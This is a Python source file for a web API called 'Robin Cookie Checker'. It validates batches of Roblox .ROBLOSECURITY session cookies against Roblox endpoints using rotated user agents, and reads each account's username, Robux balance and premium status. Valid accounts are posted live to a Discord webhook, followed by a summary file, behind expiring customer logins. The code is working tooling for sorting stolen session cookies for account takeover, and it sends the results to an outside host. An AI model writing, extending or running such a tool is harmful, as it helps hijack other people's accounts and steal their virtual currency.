# api/check.py - API COOKIE CHECKER + DISCORD WEBHOOK LOGGING
from http.server import BaseHTTPRequestHandler
import json, requests, time, threading, random, io, queue, re
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs

# ============================================
# GLOBAL STATE & CONFIGURATION
# ============================================
checker_state = {
    'is_checking': False,
    'current_thread': None,
    'results': [],
    'webhook_url': '',
    'webhook_queue': queue.Queue(),
    'last_webhook_sent': 0,
    'webhook_worker_running': False,
    
    'live_data': {
        'status': 'idle',
        'total_checked': 0,
        'valid': 0,
        'invalid': 0,
        'robux': 0,
        'premium': 0,
        'progress': 0,
        'current': 0,
        'total': 0,
        'start_time': None,
        'webhook_enabled': False
    }
}

# Simple in-memory user database (for demo)
# In production, use a real database!
USER_DB = {
    'customer1': {'password': 'pass123', 'expiry': time.time() + 86400 * 30},  # 30 days
    'customer2': {'password': 'pass456', 'expiry': time.time() + 86400 * 7},   # 7 days
}

# ============================================
# WEBHOOK WORKER THREAD
# ============================================
def webhook_worker():
    """Background thread to send webhooks with rate limiting"""
    while checker_state['webhook_worker_running']:
        try:
            # Get webhook task from queue (wait up to 1 second)
            task = checker_state['webhook_queue'].get(timeout=1)
            webhook_url, payload, files = task
            
            # Rate limiting: max 1 request per 1.1 seconds (Discord limit: 50/10s)
            current_time = time.time()
            time_since_last = current_time - checker_state['last_webhook_sent']
            
            if time_since_last < 1.1:
                time.sleep(1.1 - time_since_last)
            
            # Send to Discord webhook
            try:
                if files:
                    response = requests.post(webhook_url, files=files, data=payload, timeout=10)
                else:
                    response = requests.post(webhook_url, json=payload, timeout=10)
                
                if response.status_code in [200, 204]:
                    print(f"[WEBHOOK] Sent successfully")
                else:
                    print(f"[WEBHOOK ERROR] {response.status_code}: {response.text}")
                    
            except Exception as e:
                print(f"[WEBHOOK ERROR] {e}")
            
            checker_state['last_webhook_sent'] = time.time()
            checker_state['webhook_queue'].task_done()
            
        except queue.Empty:
            continue
        except Exception as e:
            print(f"[WEBHOOK WORKER ERROR] {e}")
            time.sleep(1)

# ============================================
# HTTP HANDLER CLASS
# ============================================
class handler(BaseHTTPRequestHandler):
    
    def do_OPTIONS(self):
        """Handle CORS preflight"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization')
        self.end_headers()
    
    def do_GET(self):
        """Handle GET requests"""
        parsed_path = urlparse(self.path)
        path = parsed_path.path
        
        if path == '/api/check':
            # Check authorization
            if not self.verify_auth():
                return
            
            query = parse_qs(parsed_path.query)
            
            if 'action' not in query or query['action'][0] == 'status':
                # Return checker status
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                
                response = {
                    'success': True,
                    'status': checker_state['live_data']['status'],
                    'is_checking': checker_state['is_checking'],
                    'stats': checker_state['live_data'],
                    'time': datetime.now(timezone.utc).isoformat()
                }
                
                self.wfile.write(json.dumps(response).encode())
                
            elif query['action'][0] == 'results':
                # Return checking results
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                
                self.wfile.write(json.dumps(checker_state['results'][-100:]).encode())
            
            else:
                self.send_response(404)
                self.end_headers()
                
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        """Handle POST requests"""
        if self.path == '/api/check':
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                data = json.loads(post_data)
                
                # Verify user authentication
                if not self.verify_auth():
                    return
                
                action = data.get('action', '')
                
                if action == 'start':
                    # Start checking cookies
                    cookies = data.get('cookies', [])
                    webhook_url = data.get('webhook_url', '').strip()
                    
                    if not cookies:
                        self.send_error_response('No cookies provided')
                        return
                    
                    if checker_state['is_checking']:
                        self.send_error_response('Checker is already running')
                        return
                    
                    # Start webhook worker if not running
                    if webhook_url and not checker_state['webhook_worker_running']:
                        checker_state['webhook_worker_running'] = True
                        worker_thread = threading.Thread(target=webhook_worker)
                        worker_thread.daemon = True
                        worker_thread.start()
                    
                    # Reset state and start checking
                    checker_state['is_checking'] = True
                    checker_state['webhook_url'] = webhook_url
                    checker_state['results'] = []
                    checker_state['live_data'] = {
                        'status': 'running',
                        'total_checked': 0,
                        'valid': 0,
                        'invalid': 0,
                        'robux': 0,
                        'premium': 0,
                        'progress': 0,
                        'current': 1,
                        'total': len(cookies),
                        'start_time': time.time(),
                        'webhook_enabled': bool(webhook_url)
                    }
                    
                    # Start checking in background thread
                    thread = threading.Thread(target=check_cookies_batch, args=(cookies,))
                    thread.daemon = True
                    thread.start()
                    checker_state['current_thread'] = thread
                    
                    self.send_success_response({
                        'message': f'Started checking {len(cookies)} cookies',
                        'total': len(cookies),
                        'webhook_enabled': bool(webhook_url)
                    })
                
                elif action == 'stop':
                    # Stop checking
                    checker_state['is_checking'] = False
                    checker_state['live_data']['status'] = 'stopped'
                    
                    self.send_success_response({
                        'message': 'Checker stopped'
                    })
                
                elif action == 'test':
                    # Test single cookie
                    cookie = data.get('cookie', '')
                    if not cookie:
                        self.send_error_response('No cookie provided')
                        return
                    
                    result = check_single_cookie(cookie, 0)
                    
                    # Add to results
                    checker_state['results'].append(result)
                    
                    # Update stats
                    if result['status'] == 'valid':
                        checker_state['live_data']['valid'] += 1
                        checker_state['live_data']['robux'] += result.get('robux', 0)
                        checker_state['live_data']['premium'] += 1 if result.get('premium') else 0
                    else:
                        checker_state['live_data']['invalid'] += 1
                    
                    checker_state['live_data']['total_checked'] += 1
                    
                    # Send to webhook if enabled
                    webhook_url = checker_state['webhook_url']
                    if webhook_url and result['status'] == 'valid':
                        send_webhook_single(result, webhook_url)
                    
                    self.send_success_response(result)
                
                elif action == 'clear':
                    # Clear results
                    checker_state['results'] = []
                    checker_state['live_data'] = {
                        'status': 'idle',
                        'total_checked': 0,
                        'valid': 0,
                        'invalid': 0,
                        'robux': 0,
                        'premium': 0,
                        'progress': 0,
                        'current': 0,
                        'total': 0,
                        'start_time': None,
                        'webhook_enabled': bool(checker_state['webhook_url'])
                    }
                    
                    self.send_success_response({
                        'message': 'Results cleared'
                    })
                
                else:
                    self.send_error_response('Invalid action')
                    
            except Exception as e:
                self.send_error_response(str(e))
        
        elif self.path == '/api/check/login':
            # User login endpoint
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                data = json.loads(post_data)
                
                username = data.get('username', '').strip().lower()
                password = data.get('password', '')
                
                # Check user credentials
                if username in USER_DB:
                    user = USER_DB[username]
                    
                    # Check password
                    if user['password'] != password:
                        self.send_error_response('Invalid password', 401)
                        return
                    
                    # Check expiry
                    if user['expiry'] < time.time():
                        self.send_error_response('Account expired', 403)
                        return
                    
                    # Generate simple token (in production, use JWT)
                    token = f"user_{username}_{int(time.time())}"
                    
                    self.send_success_response({
                        'success': True,
                        'token': token,
                        'username': username,
                        'expiry': user['expiry'],
                        'expiry_date': datetime.fromtimestamp(user['expiry']).strftime('%Y-%m-%d %H:%M:%S'),
                        'days_left': max(0, int((user['expiry'] - time.time()) / 86400))
                    })
                    
                else:
                    self.send_error_response('User not found', 404)
                    
            except Exception as e:
                self.send_error_response(str(e))
                
        else:
            self.send_response(404)
            self.end_headers()
    
    def verify_auth(self):
        """Verify user authentication"""
        auth_header = self.headers.get('Authorization', '')
        
        if auth_header.startswith('Bearer '):
            token = auth_header[7:]
            # Simple token validation (in production, validate JWT)
            if token and token.startswith('user_'):
                return True
        
        # For login endpoint, no auth required
        if self.path == '/api/check/login':
            return True
            
        self.send_response(401)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({
            'success': False,
            'error': 'Unauthorized'
        }).encode())
        return False
    
    def send_success_response(self, data):
        """Send successful response"""
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        if 'success' not in data:
            data['success'] = True
            
        self.wfile.write(json.dumps(data).encode())
    
    def send_error_response(self, message, status_code=400):
        """Send error response"""
        self.send_response(status_code)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        self.wfile.write(json.dumps({
            'success': False,
            'error': message
        }).encode())

# ============================================
# CORE CHECKING FUNCTIONS
# ============================================
def check_cookies_batch(cookies):
    """Check multiple cookies in batch"""
    webhook_url = checker_state['webhook_url']
    
    for i, cookie in enumerate(cookies):
        if not checker_state['is_checking']:
            break
        
        # Update progress
        checker_state['live_data']['current'] = i + 1
        checker_state['live_data']['progress'] = int(((i + 1) / len(cookies)) * 100)
        
        # Check single cookie
        result = check_single_cookie(cookie, i)
        checker_state['results'].append(result)
        
        # Update stats
        checker_state['live_data']['total_checked'] += 1
        
        if result['status'] == 'valid':
            checker_state['live_data']['valid'] += 1
            checker_state['live_data']['robux'] += result.get('robux', 0)
            if result.get('premium'):
                checker_state['live_data']['premium'] += 1
            
            # Send valid cookie to webhook immediately
            if webhook_url:
                send_webhook_single(result, webhook_url)
        else:
            checker_state['live_data']['invalid'] += 1
        
        # Delay between checks (1 second)
        if i < len(cookies) - 1 and checker_state['is_checking']:
            time.sleep(1)
    
    # Checking completed
    if checker_state['is_checking']:
        checker_state['is_checking'] = False
        checker_state['live_data']['status'] = 'completed'
        
        # Send final report to webhook
        if webhook_url and checker_state['results']:
            send_webhook_final(checker_state['results'], webhook_url)

def check_single_cookie(cookie, cookie_id=0):
    """Check single Roblox cookie"""
    headers = {
        'User-Agent': get_random_user_agent(),
        'Cookie': f'.ROBLOSECURITY={cookie}',
        'Accept': 'application/json',
        'X-CSRF-TOKEN': ''
    }
    
    result = {
        'cookie_id': cookie_id,
        'status': 'error',
        'username': 'Unknown',
        'user_id': 'Unknown',
        'display_name': 'Unknown',
        'premium': False,
        'robux': 0,
        'error': 'Unknown error',
        'cookie_preview': cookie[:50] + '...' if len(cookie) > 50 else cookie,
        'timestamp': datetime.now(timezone.utc).isoformat()
    }
    
    try:
        # Method 1: Authenticated user endpoint
        auth_url = "https://users.roblox.com/v1/users/authenticated"
        response = requests.get(auth_url, headers=headers, timeout=30)
        
        if response.status_code == 200:
            user_data = response.json()
            result['username'] = user_data.get('name', 'Unknown')
            result['user_id'] = str(user_data.get('id', 'Unknown'))
            result['display_name'] = user_data.get('displayName', 'Unknown')
            result['status'] = 'valid'
            result['error'] = None
            
            # Get premium status
            try:
                premium_url = "https://premiumfeatures.roblox.com/v1/users/premium/membership"
                premium_resp = requests.get(premium_url, headers=headers, timeout=10)
                if premium_resp.status_code == 200:
                    result['premium'] = premium_resp.json().get('isPremium', False)
            except:
                pass
            
            # Get Robux balance
            try:
                economy_url = "https://economy.roblox.com/v1/user/currency"
                economy_resp = requests.get(economy_url, headers=headers, timeout=10)
                if economy_resp.status_code == 200:
                    result['robux'] = economy_resp.json().get('robux', 0)
            except:
                pass
                
        elif response.status_code == 401:
            result['status'] = 'invalid'
            result['error'] = 'Unauthorized (Cookie expired/invalid)'
        elif response.status_code == 403:
            result['status'] = 'invalid'
            result['error'] = 'Forbidden (Security restriction)'
        elif response.status_code == 429:
            result['status'] = 'rate_limited'
            result['error'] = 'Rate limited by Roblox'
        else:
            result['status'] = 'error'
            result['error'] = f'HTTP {response.status_code}'
            
    except requests.exceptions.Timeout:
        result['status'] = 'error'
        result['error'] = 'Request timeout'
    except requests.exceptions.ConnectionError:
        result['status'] = 'error'
        result['error'] = 'Connection error'
    except Exception as e:
        result['status'] = 'error'
        result['error'] = str(e)
    
    return result

def get_random_user_agent():
    """Get random user agent"""
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ]
    return random.choice(user_agents)

# ============================================
# DISCORD WEBHOOK FUNCTIONS
# ============================================
def send_webhook_single(result, webhook_url):
    """Send single cookie result to Discord webhook"""
    try:
        if result['status'] == 'valid':
            color = 0x00ff00  # Green
            title = f"✅ VALID COOKIE: {result['username']}"
            
            fields = [
                {"name": "💰 Robux", "value": f"`{result['robux']:,}`", "inline": True},
                {"name": "💎 Premium", "value": "✅ YES" if result['premium'] else "❌ NO", "inline": True},
                {"name": "🆔 User ID", "value": f"`{result['user_id']}`", "inline": True},
                {"name": "🔢 Cookie #", "value": f"`{result['cookie_id'] + 1}`", "inline": True}
            ]
            
            thumbnail = {"url": f"https://www.roblox.com/headshot-thumbnail/image?userId={result['user_id']}&width=150&height=150&format=png"}
        else:
            color = 0xff0000  # Red
            title = f"❌ {result['status'].upper()}"
            
            fields = [
                {"name": "🚫 Error", "value": f"```{result['error']}```", "inline": False},
                {"name": "🔢 Cookie #", "value": f"`{result['cookie_id'] + 1}`", "inline": True}
            ]
            thumbnail = None
        
        embed = {
            "title": title,
            "color": color,
            "fields": fields,
            "footer": {
                "text": f"Robin Cookie Checker • {datetime.now().strftime('%H:%M:%S')}"
            },
            "timestamp": result['timestamp']
        }
        
        if thumbnail:
            embed["thumbnail"] = thumbnail
        
        payload = {
            "embeds": [embed],
            "username": "Cookie Checker Live",
            "avatar_url": "https://cdn.discordapp.com/emojis/1023159327851151460.png"
        }
        
        # Add to webhook queue for rate limiting
        checker_state['webhook_queue'].put((webhook_url, payload, None))
        
    except Exception as e:
        print(f"[WEBHOOK ERROR] Failed to prepare webhook: {e}")

def send_webhook_final(results, webhook_url):
    """Send final report with file attachment to Discord"""
    try:
        valid_results = [r for r in results if r['status'] == 'valid']
        invalid_results = [r for r in results if r['status'] != 'valid']
        total_robux = sum([r.get('robux', 0) for r in valid_results])
        premium_count = len([r for r in valid_results if r.get('premium', False)])
        
        # Create embed
        embed = {
            "title": "📊 CHECK COMPLETED",
            "description": f"✅ **Valid:** {len(valid_results)}\n❌ **Invalid:** {len(invalid_results)}\n💰 **Total Robux:** {total_robux:,}\n💎 **Premium:** {premium_count}",
            "color": 0x3498db,  # Blue
            "fields": [],
            "footer": {
                "text": f"Total checked: {len(results)} • {datetime.now().strftime('%Y-%m-%d %H:%M')}"
            },
            "timestamp": datetime.now(timezone.utc).isoformat()
        }
        
        # Add top valid cookies to embed
        if valid_results:
            top_cookies = []
            for i, result in enumerate(valid_results[:5]):  # Limit to 5
                premium = "💎" if result['premium'] else ""
                top_cookies.append(f"`{result['username']}` - 💰 {result['robux']:,} {premium}")
            
            if top_cookies:
                embed["fields"].append({
                    "name": f"🏆 Top Cookies ({len(valid_results)} total)",
                    "value": "\n".join(top_cookies),
                    "inline": False
                })
        
        # Create valid cookies file
        file_content = ""
        if valid_results:
            file_content = "# VALID ROBLOX COOKIES\n"
            file_content += f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            file_content += f"# Tool: Robin Cookie Checker Pro\n"
            file_content += f"# Total Valid: {len(valid_results)} cookies\n\n"
            
            file_content += "# FORMAT: Username | Robux | Premium | User ID\n"
            file_content += "# " + "-"*50 + "\n\n"
            
            for result in valid_results:
                premium = "PREMIUM" if result['premium'] else "REGULAR"
                file_content += f"{result['username']} | {result['robux']} | {premium} | {result['user_id']}\n"
        
        # Prepare file for Discord
        file_buffer = io.BytesIO(file_content.encode('utf-8'))
        
        # Create payload with file attachment
        files = {
            'file': ('valid_cookies.txt', file_buffer, 'text/plain')
        }
        
        data = {
            'payload_json': json.dumps({
                "embeds": [embed],
                "username": "Final Report",
                "avatar_url": "https://cdn.discordapp.com/emojis/1023159327851151460.png"
            })
        }
        
        # Add to webhook queue
        checker_state['webhook_queue'].put((webhook_url, data, files))
        
        print(f"[WEBHOOK] Final report prepared for {len(valid_results)} valid cookies")
        
    except Exception as e:
        print(f"[WEBHOOK ERROR] Failed to prepare final report: {e}")

# ============================================
# INITIALIZATION
# ============================================
# Start webhook worker thread if needed
if checker_state['webhook_url'] and not checker_state['webhook_worker_running']:
    checker_state['webhook_worker_running'] = True
    worker_thread = threading.Thread(target=webhook_worker)
    worker_thread.daemon = True
    worker_thread.start()

print("[API] Roblox Cookie Checker API initialized with Discord webhook support")